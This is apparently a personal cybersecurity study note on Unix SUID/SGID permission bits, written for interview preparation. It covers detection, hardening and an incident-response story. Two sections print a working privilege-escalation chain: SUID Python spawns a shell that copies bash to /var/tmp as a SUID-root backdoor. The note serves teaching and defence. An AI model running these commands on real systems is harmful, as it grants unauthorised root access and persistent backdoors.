---
dg-publish: true
tags:
  - "#cybersecurity/red-team/privilege-escalation"
  - "#cybersecurity/blue-team/hardening"
  - "#interview/concepts"
aliases:
  - SUID
  - SGID
  - SetUID
  - SetGID
  - SUID bit
  - SGID bit
---

# SUID and SGID Permissions

> **One-liner:** Special Unix permission bits that allow executables to run with the privileges of the file owner (SUID) or group (SGID) rather than the user executing them—a common privilege escalation vector when misconfigured.

## 🎯 What Is It?

**SUID (Set User ID)** and **SGID (Set Group ID)** are special permission bits in Unix/Linux that modify how executables run:

| Permission | Bit | Effect | Notation |
|------------|-----|--------|----------|
| **SUID** | `u+s` | Execute as file **owner** | `-rwsr-xr-x` (s in owner execute) |
| **SGID** | `g+s` | Execute as file **group** | `-rwxr-sr-x` (s in group execute) |

**Example:** `/usr/bin/passwd` has SUID root. When a regular user runs `passwd` to change their password, the binary temporarily runs as root to modify `/etc/shadow`.

## 🤔 Why It Matters

- **Legitimate Use:** Necessary for utilities like `passwd`, `sudo`, `ping` that require elevated privileges
- **Attack Vector:** Misconfigured SUID binaries are a primary Linux privilege escalation path
- **Persistence:** Attackers create SUID shells (e.g., SUID copy of `/bin/bash`) for backdoor root access
- **Defense:** Regular audits of SUID binaries are critical hardening practice

## 🔬 How It Works

### Core Principles
1. SUID/SGID bits are set via `chmod`
2. When executed, the **effective UID/GID** changes to the file owner/group
3. Displayed as `s` in execute permission field
4. Capital `S` means the bit is set but execute permission is missing (useless)

### Technical Deep-Dive

#### Viewing SUID/SGID Binaries
```bash
# Find all SUID binaries (runs as owner)
find / -perm -u=s -type f 2>/dev/null

# Find all SGID binaries (runs as group)
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -perm /6000 -type f 2>/dev/null

# Detailed listing
ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 Mar 14  2024 /usr/bin/passwd
```

#### Octal Notation
```bash
# SUID = 4, SGID = 2, Sticky = 1 (first digit)
chmod 4755 file  # SUID + rwxr-xr-x
chmod 2755 file  # SGID + rwxr-xr-x
chmod 6755 file  # SUID + SGID + rwxr-xr-x

# Example from writeup: attacker creates SUID bash
cp /bin/bash /var/tmp/bash
chown root:root /var/tmp/bash
chmod +s /var/tmp/bash  # Sets SUID bit
```

#### Exploitation Example (from writeup)
```bash
# 1. Attacker finds SUID Python binary
find / -perm -u=s -type f 2>/dev/null | grep python
# Output: /usr/bin/python3.8

# 2. Exploits SUID Python to execute commands as root
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'

# 3. Now has persistent SUID root shell
/var/tmp/bash -p  # -p preserves SUID privileges
# whoami → root
```

## 🛡️ Detection & Prevention

### How to Detect

#### Forensic Investigation
```bash
# Find recently created SUID binaries (last 24h)
find / -perm -u=s -type f -mtime -1 2>/dev/null

# Suspicious locations for SUID binaries
find /tmp /var/tmp /dev/shm -perm -u=s 2>/dev/null

# Compare against baseline
# Good practice: maintain list of known-good SUID binaries
find / -perm -u=s -type f 2>/dev/null > suid_baseline.txt
```

#### Common Suspicious SUID Binaries
| Binary | Legitimate? | Risk |
|--------|-------------|------|
| `/usr/bin/passwd` | ✅ Yes | Normal—needed for password changes |
| `/usr/bin/sudo` | ✅ Yes | Normal—core privilege elevation |
| `/usr/bin/python3` | ❌ **NO** | **Critical**—trivial to escalate |
| `/bin/bash` in `/tmp` or `/var/tmp` | ❌ **NO** | **Backdoor**—persistent root access |
| Custom binaries in world-writable dirs | ❌ **NO** | **Highly suspicious** |

### How to Prevent / Mitigate

#### Hardening Practices
```bash
# Remove unnecessary SUID binaries
chmod u-s /usr/bin/rarely-used-binary

# Mount filesystems with nosuid option
# /etc/fstab:
/dev/sda2 /home ext4 defaults,nosuid 0 2
/dev/sda3 /tmp  ext4 defaults,nosuid 0 2

# Regular audit
# Weekly cron job to alert on new SUID files
find / -perm -u=s -type f 2>/dev/null | diff - /root/suid_baseline.txt
```

#### GTFOBins Check
Before granting SUID to any binary, check [GTFOBins](https://gtfobins.github.io/) to see if it can be exploited for privilege escalation.

Examples of SUID-exploitable binaries:
- `python`, `perl`, `ruby`, `php`, `lua`
- `vim`, `nano`, `less`, `more`
- `find`, `awk`, `sed`
- `tar`, `zip`, `unzip`

## 📊 Types/Categories

### Legitimate SUID Binaries
| Binary | Owner | Why SUID Needed |
|--------|-------|-----------------|
| `/usr/bin/passwd` | root | Modify `/etc/shadow` |
| `/usr/bin/sudo` | root | Execute commands as root |
| `/usr/bin/mount` | root | Mount filesystems |
| `/usr/bin/ping` | root | Raw socket access (ICMP) |

### Attack Patterns
| Scenario | Technique | Example |
|----------|-----------|---------|
| **Misconfigured SUID** | Exploit existing SUID binary | SUID Python → `os.execl("/bin/sh")` |
| **SUID Shell Backdoor** | Copy bash with SUID bit | `/var/tmp/bash -p` |
| **Wrapper Script Abuse** | SUID script calls relative path binary | `PATH` injection attack |

## 🎤 Interview Angles

### Common Questions
- **"What is SUID and why is it dangerous?"**
  - *"SUID allows a binary to run with the owner's privileges instead of the user's. It's dangerous when misconfigured because an attacker can abuse SUID binaries—like a SUID Python or bash—to escalate from low-privilege user to root."*

- **"How would you find SUID binaries during a pentest?"**
  - `find / -perm -u=s -type f 2>/dev/null`

- **"What's the difference between SUID and sudo?"**
  - *"SUID is a file permission that makes the binary always run as the owner. Sudo is a command that grants temporary privilege elevation based on policy (`/etc/sudoers`). SUID is automatic, sudo requires authentication."*

### STAR Story
> **Situation:** During incident response on a compromised Linux web server, found evidence of privilege escalation to root.
> **Task:** Determine how the attacker escalated from `www-data` user to root.
> **Action:** Ran `find` to enumerate SUID binaries. Discovered `/usr/bin/python3.8` had SUID bit set (misconfiguration). Checked `/home/jane/.bash_history` and found the command used to exploit SUID Python and create a SUID bash backdoor in `/var/tmp/bash`. Verified integrity of original `/bin/bash` using `md5sum`—hashes matched, confirming `/var/tmp/bash` was a copy.
> **Result:** Identified attack chain: file upload vulnerability → web shell → SUID Python exploitation → persistent SUID bash backdoor. Removed SUID bit from Python, deleted backdoor, implemented FIM to alert on new SUID binaries, and hardened web app to prevent future file uploads.

## ✅ Best Practices

- **Principle of Least Privilege:** Only set SUID when absolutely necessary
- **Baseline Monitoring:** Maintain and monitor list of approved SUID binaries
- **Use `nosuid` Mount Option:** Prevent SUID execution in `/tmp`, `/home`, etc.
- **Regular Audits:** Weekly scans for new or unexpected SUID binaries
- **Check GTFOBins:** Before granting SUID, verify binary can't be exploited
- **Use `capabilities` Instead:** Linux capabilities provide fine-grained privileges without full SUID root

## ❌ Common Misconceptions

- **"SUID is only on binaries"** (False: can be set on any file, but only affects executables)
- **"Removing SUID breaks the system"** (Partially false: only remove from binaries that truly need it—test first)
- **"Capital S means it works"** (False: `S` means SUID bit set but no execute permission—it does nothing)
- **"SUID on shell scripts is safe"** (False: shell scripts ignore SUID for security reasons; only compiled binaries honor it)

## 🔗 Related Concepts

- [[Privilege Escalation]] — SUID abuse is a primary PrivEsc vector
- [[Linux]] — Filesystem permissions
- [[GTFOBins]] — Database of exploitable SUID binaries
- [[Persistence (Cyber Security)]] — SUID backdoors for persistence
- [[File Timestamps (mtime, ctime, atime)]] — Detecting recently created SUID files
- [[Living off the Land (LOLBAS)]] — Abusing legitimate system binaries

## 📚 References

- [GTFOBins: SUID](https://gtfobins.github.io/#+suid)
- [Linux Privilege Escalation via SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid)
- [TryHackMe: Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis)
- SANS: Linux Privilege Escalation
